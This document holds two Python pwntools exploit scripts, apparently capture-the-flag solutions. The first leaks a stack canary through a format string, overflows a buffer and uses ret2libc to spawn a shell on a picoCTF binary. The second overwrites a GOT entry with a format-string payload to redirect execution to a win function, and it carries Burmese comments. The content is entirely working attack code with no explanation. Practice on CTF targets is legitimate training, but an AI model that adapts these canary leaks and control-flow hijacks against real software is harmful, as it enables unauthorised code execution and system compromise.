



```python

from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("shape-facility.picoctf.net",58416)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break *0x080487ce
            continue
        ''')
    else:
        return process(elf.path)
    


def canary_leak(p):
     p.recvuntil(b"Name? ")
     p.sendline(b"%135$p")
     p.recvuntil(b"Congrats: ")
     canaryvalue = p.recvline()
     canaryvalue = canaryvalue.decode().replace("\n","")
     return canaryvalue

def bruteforce(p):
    #for i in range(-4000, 4096):
        try:
            i = -3727
            p.sendlineafter(b"What number would you like to guess?\n", str(i).encode())
            print(f"Trying number: {i}", end="\r")
            out = p.recvline().decode()
            if "Congrats!" in out:
                print(f"\n[+] Found the number: {i}")
                #p.recvuntil(b"Name? ") 
                return i
            
        except EOFError:
            print("error")
            return None    
        

def leakaddress(p, canary, n):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(elf.plt['puts'])
    payload += p32(elf.sym['win'])
    payload += p32(elf.got['puts'])
    p.sendlineafter("What number would you like to guess?\n", str(n).encode())
    p.recvuntil(b"Name? ")
    p.sendline(payload)
    
    a = p.readline()
    b = p.readline()               
    print(a.decode(), "  and "   ,b.decode())
    
    leaked_raw = p.recv(4)    
    leak_int = u32(leaked_raw) 
    
    return leak_int

def get_shell(io, canary, sys_addr, binsh_addr):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(sys_addr)
    payload += p32(elf.sym['win'])
    payload += p32(binsh_addr)
    io.recvuntil(b"Name? ")
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io = start()
    num = bruteforce(io)
    canaryV = canary_leak(io)
    print(canaryV)
    #print(hex(elf.plt['printf']))
    #print(hex(elf.got['printf']))
    putsaddress = leakaddress(io, canaryV, num)
    libc_base = putsaddress - 0x067560
    sys_addr = libc_base + 0x03cf10
    binsh_addr = libc_base + 0x17b9db
    get_shell(io, canaryV, sys_addr, binsh_addr)

```


```python
from pwn import *


context.log_level = 'info'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    
    win_addr = 0x40123b 
    target_got = 0x404018 

    offset = 10 # printf သုံးပြီး buffer အစထိ offset

    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
    payload = fmtstr_payload(offset, {target_got: win_addr})
    print(payload.decode())
    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    print(payload.decode())
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```


